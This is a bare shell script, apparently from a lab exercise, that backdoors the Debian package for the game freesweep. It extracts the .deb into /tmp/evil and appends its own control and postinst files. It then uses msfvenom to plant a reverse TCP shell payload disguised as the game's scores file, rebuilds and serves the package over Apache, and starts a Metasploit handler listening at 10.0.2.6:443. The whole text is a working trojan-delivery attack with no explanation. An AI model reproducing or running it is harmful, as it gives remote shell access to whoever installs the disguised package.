pwd=$(pwd)
rm -rf /tmp/free*
rm -rf /var/www/html/free*

apt-get --download-only install freesweep
mkdir /tmp/evil
cd /tmp/evil/
dpkg -x freesweep_1.0.1-1_amd64.deb work
cd work/DEBIAN/
cat $pwd/control >> control
cat $pwd/postinst >> postinst
msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=10.0.2.6 LPORT=443 -b "\x00" -f elf -o /tmp/evil/work/usr/games/freesweep_scores
chmod 755 postinst
dpkg-deb --build /tmp/evil/work
mv work.deb freesweep.deb
cd ../..
mv work.deb freesweep.deb
cp freesweep.deb /var/www/html/
service apache2 start
msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST 10.0.2.6; set LPORT 443; run; exit -y"
